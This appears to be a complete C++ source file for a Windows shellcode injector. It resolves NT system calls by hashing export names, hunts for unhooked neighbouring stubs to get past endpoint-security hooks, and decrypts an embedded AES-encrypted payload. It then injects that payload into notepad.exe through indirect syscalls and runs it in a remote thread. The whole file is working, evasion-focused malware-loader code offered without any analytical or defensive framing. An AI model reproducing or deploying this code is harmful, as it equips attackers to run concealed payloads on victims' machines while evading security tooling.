// HgIndirect.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <TlHelp32.h>
#include "peb.h"
#pragma comment (lib, "crypt32.lib")

#define UP -32
#define DOWN 32

extern "C" VOID sysPrepare(WORD wSystemCall, UINT_PTR addy);

extern "C" NTSTATUS sysNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);

extern "C" NTSTATUS sysNtAllocateVirtualMem(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);

extern "C" NTSTATUS sysNtWriteVirtualMem(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PULONG NumberOfBytesWritten);

extern "C" NTSTATUS sysNtProtectVirtualMem(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);

extern "C" NTSTATUS sysNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG CreateSuspended, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PPS_ATTRIBUTE_LIST AttributeList);

extern "C" NTSTATUS sysNtWaitForSingleObject(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER TimeOut);


unsigned char payload[] = { 0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8, 0x50, 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0x2c, 0x2a, 0xcc, 0x7c, 0xf1, 0x6a, 0xa5, 0x48, 0x10, 0x57, 0x10, 0x7e, 0x10, 0x24, 0x5, 0x90, 0x40, 0x14, 0x7d, 0xd3, 0xba, 0x4e, 0x7f, 0x5, 0xb7, 0x17, 0xa3, 0x4, 0x91, 0x5, 0x97, 0xd7, 0xcb, 0xa2, 0x34, 0x7c, 0x90, 0xc9, 0x4f, 0x65, 0x9d, 0x18, 0x29, 0x15, 0xd8, 0xf9, 0x1d, 0xed, 0x96, 0xc4, 0x1f, 0xee, 0x2c, 0x80, 0xc8, 0x15, 0x4b, 0x68, 0x46, 0xa0, 0xe8, 0xc0, 0xb8, 0x5f, 0x5e, 0xd5, 0x5d, 0x7d, 0xd2, 0x52, 0x9b, 0x20, 0x76, 0xe0, 0xe0, 0x52, 0x23, 0xdd, 0x1a, 0x39, 0x5b, 0x66, 0x8c, 0x26, 0x9e, 0xef, 0xf, 0xfd, 0x26, 0x32, 0x30, 0xa0, 0xf2, 0x8c, 0x2f, 0xa5, 0x9, 0x2, 0x1c, 0xfe, 0x4a, 0xe8, 0x81, 0xae, 0x27, 0xcf, 0x2, 0xaf, 0x18, 0x54, 0x3c, 0x97, 0x35, 0xfe, 0xaf, 0x79, 0x35, 0xfa, 0x99, 0x3c, 0xca, 0x18, 0x8d, 0xa1, 0xac, 0x2e, 0x1e, 0x78, 0xb6, 0x4, 0x79, 0x5e, 0xa7, 0x6d, 0x7f, 0x6e, 0xa3, 0x34, 0x8b, 0x68, 0x6d, 0x2a, 0x26, 0x49, 0x1e, 0xda, 0x5e, 0xe4, 0x77, 0x29, 0x6e, 0x15, 0x9, 0x69, 0x8b, 0x8d, 0xbd, 0x42, 0xb6, 0xd9, 0xb0, 0x90, 0xd8, 0xa1, 0xb9, 0x37, 0x80, 0x8c, 0x5d, 0xaf, 0x98, 0x11, 0xef, 0xe1, 0xcf, 0xec, 0xe7, 0xc5, 0x58, 0x73, 0xf, 0xce, 0x1e, 0x27, 0x9e, 0xc0, 0x8a, 0x36, 0xd5, 0x6b, 0x9d, 0x52, 0xe, 0x68, 0x30, 0x7c, 0x45, 0x7c, 0xb3, 0xc1, 0x3f, 0x88, 0xdc, 0x78, 0x2, 0xe6, 0xbf, 0x45, 0x2d, 0x56, 0x76, 0x15, 0xc8, 0x4c, 0xe2, 0xcd, 0xa4, 0x46, 0x38, 0x6b, 0x41, 0x2b, 0xdf, 0x24, 0x2c, 0xf1, 0x82, 0x78, 0xd1, 0xc4, 0x83, 0x7f, 0x33, 0xb5, 0x8c, 0xf7, 0xac, 0x30, 0x14, 0x0, 0x6f, 0xba, 0xf7, 0x13, 0x51, 0x6a, 0x17, 0x1c, 0xf7, 0xcd, 0x43, 0x79, 0xc2, 0x57, 0xa0, 0x9c, 0x7b, 0x12, 0xce, 0x45, 0x41, 0x4e, 0xb7, 0x6b, 0xbd, 0x22, 0xc, 0xfb, 0x88, 0x2a, 0x4c, 0x2, 0x84, 0xf4, 0xca, 0x26, 0x62, 0x48, 0x6e, 0x9b, 0x3b, 0x85, 0x22, 0xff, 0xf0, 0x4f, 0x55, 0x7b, 0xc3, 0xf4, 0x9d, 0x2d, 0xe8, 0xb6, 0x44, 0x4a, 0x23, 0x2d, 0xf9, 0xe1, 0x6, 0x1c, 0x74, 0x23, 0x6, 0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };
unsigned char key[] = { 0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };

unsigned int payload_len = sizeof(payload);

PTEB getTeb() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetSysTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, pSys_Entry pSysEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2((PBYTE)pczFunctionName) == pSysEntry->hash) {
			pSysEntry->pAddy = pFunctionAddress;

			// First opcodes should be :
			//    MOV R10, RCX
			//    MOV RAX, <syscall>
			if (*((PBYTE)pFunctionAddress) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6) == 0x00
				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

				BYTE high = *((PBYTE)pFunctionAddress + 5);
				BYTE low = *((PBYTE)pFunctionAddress + 4);
				pSysEntry->wSysCall = (high << 8) | low;

				return TRUE;
			}

			// if hooked check the neighborhood to find clean syscall
			if (*((PBYTE)pFunctionAddress) == 0xe9) {

				for (WORD idx = 1; idx <= 500; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						pSysEntry->wSysCall = (high << 8) | low - idx;


						return TRUE;
					}
					// check neighboring syscall up
					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						pSysEntry->wSysCall = (high << 8) | low + idx;

						return TRUE;
					}

				}

				return FALSE;
			}
		}
	}

	ULONG_PTR ulpAddress;
	ulpAddress = (ULONG_PTR)pSysEntry->pAddy + 0x40;

	for (DWORD i = 0, j = 1; i <= 512; i++, j++) {
		if (*((PBYTE)ulpAddress + i) == 0x0f && *((PBYTE)ulpAddress + j) == 0x05) {
			pSysEntry->pSyscallRet = (PVOID)((ULONG_PTR)ulpAddress + i);
			break;
		}
	}

	return TRUE;
}

int FindTarget(const WCHAR* procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}


int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

BOOL Go(pSysTable sysTable) {
	NTSTATUS status = 0x00000000;


	//HANDLE u32 = LoadLibraryA("User32.dll");


	DWORD pid = 0;
	//Change notepad.exe to any process you would like to inject to
	pid = FindTarget(L"notepad.exe");
	HANDLE pHandle = NULL;
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)pid;
	cid.UniqueThread = NULL;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	sysPrepare(sysTable->NtOpenProcess.wSysCall, (UINT_PTR)sysTable->NtOpenProcess.pSyscallRet);
	status = sysNtOpenProcess(&pHandle, PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION, &oa, &cid);


	// Allocate memory for the shellcode
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(payload);
	sysPrepare(sysTable->NtAllocateVirtualMemory.wSysCall, (UINT_PTR)sysTable->NtAllocateVirtualMemory.pSyscallRet);
	status = sysNtAllocateVirtualMem(pHandle, &lpAddress, 0, (PULONG)&sDataSize, MEM_COMMIT, PAGE_READWRITE);

	// Decrypt payload
	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));


	sysPrepare(sysTable->NtWriteVirtualMemory.wSysCall, (UINT_PTR)sysTable->NtWriteVirtualMemory.pSyscallRet);
	status = sysNtWriteVirtualMem(pHandle, lpAddress, (PVOID)payload, sDataSize, 0);

	// Change page permissions
	ULONG ulOldProtect = 0;
	sysPrepare(sysTable->NtProtectVirtualMemory.wSysCall, (UINT_PTR)sysTable->NtProtectVirtualMemory.pSyscallRet);
	status = sysNtProtectVirtualMem(pHandle, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);



	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	sysPrepare(sysTable->NtCreateThreadEx.wSysCall, (UINT_PTR)sysTable->NtCreateThreadEx.pSyscallRet);
	status = sysNtCreateThreadEx(&hHostThread, 0x1FFFFF, &oa, pHandle, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	sysPrepare(sysTable->NtWaitForSingleObject.wSysCall, (UINT_PTR)sysTable->NtWaitForSingleObject.pSyscallRet);
	status = sysNtWaitForSingleObject(hHostThread, FALSE, &Timeout);

	return TRUE;
}


int main()
{

	PTEB pCurrentTeb = getTeb();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	sysTable Table = { 0 };

	Table.NtOpenProcess.hash = 0x718cca1f5291f6e7;
	if (!GetSysTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtOpenProcess))
		return 0x1;

	Table.NtAllocateVirtualMemory.hash = 0xf5bd373480a6b89b;
	if (!GetSysTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtWriteVirtualMemory.hash = 0x68a3c2ba486f0741;
	if (!GetSysTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.hash = 0x64dc7db288c5015f;
	if (!GetSysTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.hash = 0x858bcb1046fb6a37;
	if (!GetSysTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.hash = 0xc6a2fa174e551bcb;
	if (!GetSysTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	Go(&Table);
	return 0x00;

}

